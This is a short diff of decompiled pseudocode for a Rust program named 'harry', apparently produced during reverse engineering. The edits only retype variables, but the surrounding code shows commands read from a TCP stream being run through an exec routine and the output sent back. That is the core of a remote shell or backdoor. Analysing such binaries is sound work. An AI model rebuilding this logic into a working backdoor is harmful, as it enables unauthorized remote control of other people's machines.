@@ -12,7 +12,7 @@ void __noreturn harry::main()
   _BYTE v9[24]; // [rsp+20h] [rbp-158h] BYREF
   char **v10; // [rsp+38h] [rbp-140h] BYREF
   __int64 (__fastcall *v11)(); // [rsp+40h] [rbp-138h]
-  _QWORD *v12; // [rsp+68h] [rbp-110h] BYREF
+  _BYTE **v12; // [rsp+68h] [rbp-110h] BYREF
   __int64 (__fastcall *v13)(); // [rsp+70h] [rbp-108h]
   __int64 v14; // [rsp+78h] [rbp-100h]
   __int64 v15; // [rsp+80h] [rbp-F8h] BYREF
@@ -132,7 +132,7 @@ void __noreturn harry::main()
             alloc::string::String::pop(v9);
             v18 = *(const char **)&v9[16];
             v17 = *(_OWORD *)v9;
-            harry::exec(&v12, &v17);
+            harry::exec((__int64)&v12, (__int64 *)&v17);
             <std::net::tcp::TcpStream as std::io::Write>::write(&v17, &v6, v12, v14);
             core::ptr::drop_in_place<core::result::Result<usize,std::io::error::Error>>(&v17);
             core::ptr::drop_in_place<alloc::string::String>(&v12);
@@ -151,7 +151,7 @@ LABEL_6:
       }
     }
 LABEL_16:
-    v12 = v24;
+    v12 = (_BYTE **)v24;
     v13 = <core::net::socket_addr::SocketAddr as core::fmt::Display>::fmt;
     core::fmt::Arguments::new_v1(&v17, &off_74088, 2LL, &v12, 1LL);
     std::io::stdio::_print(&v17);
